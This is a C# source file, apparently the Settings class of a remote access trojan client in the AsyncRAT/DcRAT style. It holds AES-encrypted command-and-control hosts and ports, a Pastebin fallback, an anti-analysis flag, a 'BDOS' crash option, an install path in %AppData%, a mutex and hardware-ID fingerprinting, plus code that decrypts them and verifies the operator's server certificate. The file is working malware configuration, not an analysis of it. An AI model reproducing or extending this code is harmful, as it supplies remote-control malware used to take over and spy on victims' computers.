using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string Ports = "r02Fh1otKqa4f++9PW9ynEpd+V/oVq6aB9Qqa3HmxzFEBf5m/z75vDIe7I3eAXqxn0kexvc09rjQhJxV0Uokdw==";

	public static string Hosts = "ZtRwvYoTrV0+ZA8GNQ/I3IKth+KuYq5plbe6nt9vyDO08jukgBYUBYFVWhU9dnHGR7xy4eeR/e5SJtqHE7VhPg==";

	public static string Version = "SH4mGaUozi3YwAEanANEsFrfOQcJ/RJH/cAAdxd7lf8ddAOmH54Es8df2cHFAUwFOh35Ib+xc/XK4RSCahy1Eg==";

	public static string Install = "ZU5R03ldMBRCeGLEoNKQvlO9tzJfOlMqB7jcITUt6eQy1tI4pP6Dw3063HHFkJBPqyB1DMm8vQ2OocHt4T3aQw==";

	public static string InstallFolder = "%AppData%";

	public static string InstallFile = "";

	public static string Key = "M1JSZmRIbUZFWm1Wa3k3WDZtcFJablpaQlhvMVZtd3A=";

	public static string MTX = "5zVVPdUEwpo3GuhwpGNxt43lYI1BLtX2oW5OYBAplV/ds3DnZ7zlsYRAKNk5n0Vz3w/tJPlcIXj9sY3xiazRNsdhL++rZwqt6NBrQzJBpns=";

	public static string Certificate = "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";

	public static string Serversignature = "1930iuG2gRhkZtM9WPnMSJuDPxujjnrG/ClMetwebFXylKT6H/17U9f2v2nd2CTWL+DU+/DG1ORWhqKIVrkM7Jqtj8YGgavtQvPJ1JdCzkhLm+GkiNeIye4PLCTEn3cy97nm7s/6MX/LP7s7+V3lYUD8tmmD+IZ/sZ/S3kbotzTta5vMDRzwlRQ3PbF9ESCSceg+FliPTQ1qTQWU6uQknBMB424L7vOpspGXX2DgxDuHBFu0kJc7f8GI9UhFIgh3Mqb/hx9U6iRd8INo2gCxaENXgfVtUbSyX2bftxHHYF8+67WnSgyah+OjdSs/Q87A8An3qwbxZGeLeLf0djT4DPYZpezBSJEotl3nuKwW1a3X5YS3e1U7hTWlm4aigwugKNX9O7ZjhLtyjFOJwulMJKeSQ9v8vOf9/PIip5VCPWs1lhVw5KVpcsewfbLFKof2oyDe0YcCyWxuRUKUrqLCS3NqL0yuz0NN1tv7WXbUeUdfYQARTNKx0UEdwFc+y+WBZUjCyejKtSwCdySglTd+Ad7zoN2jtc9u02B5ic8ltLTuKdL37vrPrwFB95YJt9BCY3e8j55H7Oy3V7h5mj0eejT6QdoCu3v+BuPDyejhUBtIGvJT46sePe0byslVip4swz1vFcTJ5YflTilC7rItctWjE0yWpSNtoxaP2hIX9AV1cx6y6XEhlSXm1Mbx+1yv7CzUuiNX+4aUw3kYPSPuRsCAclsCD1cCrs6wg/FDCvQj+mD3HbV/CyvLuCsU0T6k8uDZJWXMTCeURvV37Pma+O+ebFXZ7LiK0QkhwCsfYg40mqYJazpjuYDD3jwgb6BKvLWyv4X3wUfcD/ksW/Ms/iJnycw7GTVVP58+S0F9W5E4OuSjmitkjbMu3Ea5hpa489Bof1kmULTrp5FV2SnrQ3AIhiTu1xf4X4eNQmWum9iTJYj3qOLPvM0xCT39Q4JibGyKfa7JwrrM8jYjwhHZAw==";

	public static X509Certificate2 ServerCertificate;

	public static string Anti = "IvyjKS6mbaaFtONPkMu62XIfIe87ehwwbzDA0CxO44jLw8GevJXaZZhc5lFOxFBKBrEbdAhDNe9rhsxjccX/+g==";

	public static Aes256 aes256;

	public static string Pastebin = "jXonQH9I4jm/nztLQqzkzUH4k5i/0tPp9DnwgfsKqovUZ79AXWZAoPwZjSlSwotTjNeZ37gkiw7+JHhwULys5A==";

	public static string BDOS = "DX/CsEH+5vD5IHUxgmBK/p6wbf3haAJk/ern+tgiKvZSI7Oub++UgvePsRikQdbNiDeG54JG4y9X0cBPox4+cg==";

	public static string Hwid = null;

	public static string Delay = "3";

	public static string Group = "KP0UnJNnl9uY0uA1u5SRK/zclTSxXhCZnnMPc0oOw4+QgcCDMQa46rD3Do870BTjKoxfNWmxthN5O1RzZ3lbEA==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Ports = aes256.Decrypt(Ports);
			Hosts = aes256.Decrypt(Hosts);
			Version = aes256.Decrypt(Version);
			Install = aes256.Decrypt(Install);
			MTX = aes256.Decrypt(MTX);
			Pastebin = aes256.Decrypt(Pastebin);
			Anti = aes256.Decrypt(Anti);
			BDOS = aes256.Decrypt(BDOS);
			Group = aes256.Decrypt(Group);
			Hwid = HwidGen.HWID();
			Serversignature = aes256.Decrypt(Serversignature);
			ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			return ((RSACryptoServiceProvider)ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
